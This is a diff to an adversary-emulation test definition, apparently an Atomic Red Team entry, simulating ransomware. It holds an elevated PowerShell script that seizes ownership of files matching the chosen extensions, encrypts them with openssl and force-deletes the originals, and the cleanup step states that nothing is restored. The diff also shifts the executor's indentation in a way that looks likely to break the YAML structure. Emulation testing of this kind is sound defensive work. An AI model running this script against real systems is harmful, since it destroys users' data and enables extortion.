@@ -84,45 +84,57 @@ atomic_tests:
               exit 1
           }
     executor:
-      name: powershell
-      elevation_required: true
-      command: |
-        $password = "#{encryption_password}"
-        $targetDir = "#{target_directory}"
-        $extensions = #{target_extensions}
+  name: powershell
+  elevation_required: true
+  command: |
+    $password = "#{encryption_password}"
+    $targetDir = "#{target_directory}"
+    $extensions = #{target_extensions}
 
-        if (-Not (Test-Path $targetDir)) {
-            Write-Host "❌ The target directory $targetDir does not exist."
-            exit 1
-        }
+    if (-Not (Test-Path $targetDir)) {
+        Write-Host "❌ The target directory $targetDir does not exist."
+        exit 1
+    }
 
-        Write-Host "✅ Starting encryption process..."
+    Write-Host "✅ Starting encryption process..."
 
-        foreach ($ext in $extensions) {
-            Get-ChildItem -Path $targetDir -Recurse -Filter "*$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
-                $file = $_.FullName
-                Write-Host "🔍 Processing file: $file"
-                try {
-                    takeown /F $file /A | Out-Null
-                    icacls $file /grant Administrators:F /T /C | Out-Null
-                } catch {
-                    Write-Host "❌ Failed to set permissions for: $file"
-                    return
-                }
+    # Define the real-time feedback script
+    $realTimeFeedbackScript = @"
+    `$password = '$password'
+    `$targetDir = '$targetDir'
+    `$extensions = @($($extensions -join ","))
 
-                $encryptedFile = "$file.enc"
-                Write-Host "🔒 Encrypting file: $file -> $encryptedFile"
-                openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
+    foreach (`$ext in `$extensions) {
+        Get-ChildItem -Path `$targetDir -Recurse -Filter "*`$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
+            `$file = `$_.FullName
+            Write-Host '🔍 Processing file: `$file'
+            try {
+                takeown /F `$file /A | Out-Null
+                icacls `$file /grant Administrators:F /T /C | Out-Null
+            } catch {
+                Write-Host '❌ Failed to set permissions for: `$file'
+                return
+            }
 
-                if ($LASTEXITCODE -eq 0) {
-                    Remove-Item -Path $file -Force
-                    Write-Host "🗑️ Deleted original file: $file"
-                } else {
-                    Write-Host "❌ Failed to encrypt: $file"
-                }
+            `$encryptedFile = '`$file.enc'
+            Write-Host '🔒 Encrypting file: `$file -> `$encryptedFile'
+            openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in `$file -out `$encryptedFile -pass pass:`$password
+
+            if (`$LASTEXITCODE -eq 0) {
+                Remove-Item -Path `$file -Force
+                Write-Host '✅ le fichier `$file est crypté'
+            } else {
+                Write-Host '❌ error le fichier `$file n''est pas crypté'
             }
         }
+    }
 
-        Write-Host "✅ Encryption and deletion process completed!"
+    Write-Host '✅ Encryption and deletion process completed!'
+"@
+
+    # Launch a new PowerShell window for real-time feedback
+    Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $realTimeFeedbackScript
+
+    Write-Host "✅ A new PowerShell window has been opened for real-time feedback."
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
